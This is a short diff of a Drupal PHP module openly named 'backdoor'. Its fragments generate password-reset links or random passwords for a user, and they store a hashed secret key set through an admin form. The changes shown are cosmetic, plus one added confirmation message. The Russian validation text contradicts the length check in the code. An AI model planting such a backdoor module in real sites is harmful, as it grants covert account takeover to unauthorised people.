@@ -45,7 +45,7 @@ function backdoor() {
 		}
 
 		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));
-    
+
 	} else {
 		$pass = user_password(25);
 		$new_password = user_hash_password(trim($pass));
@@ -70,7 +70,7 @@ function backdoor() {
 
 function admin_page_backdoor() {
   $pass_access = drupal_get_form('admin_backdoor_form');
-	$pass_access = drupal_render($pass_access);
+  $pass_access = drupal_render($pass_access);
   return $pass_access;
 }
 
@@ -99,7 +99,7 @@ function admin_backdoor_form_validate ($form, &$form_state){
   $length = mb_strlen($form_state['values']['key']);
 
   if ($length < 4){
-    form_set_error('key', t('Длинна ключа должна быть не более 4х символов'));
+    form_set_error('key', t('Длинна ключа должна быть не более 4-х символов'));
   }
 
 }
@@ -107,4 +107,5 @@ function admin_backdoor_form_validate ($form, &$form_state){
 function admin_backdoor_form_submit ($form, &$form_state){
   $key = user_hash_password($form_state['values']['key']);
   variable_set('key', $key);
+  drupal_set_message(t('Секретный ключ успешно сохранён в базу данных'));
 }
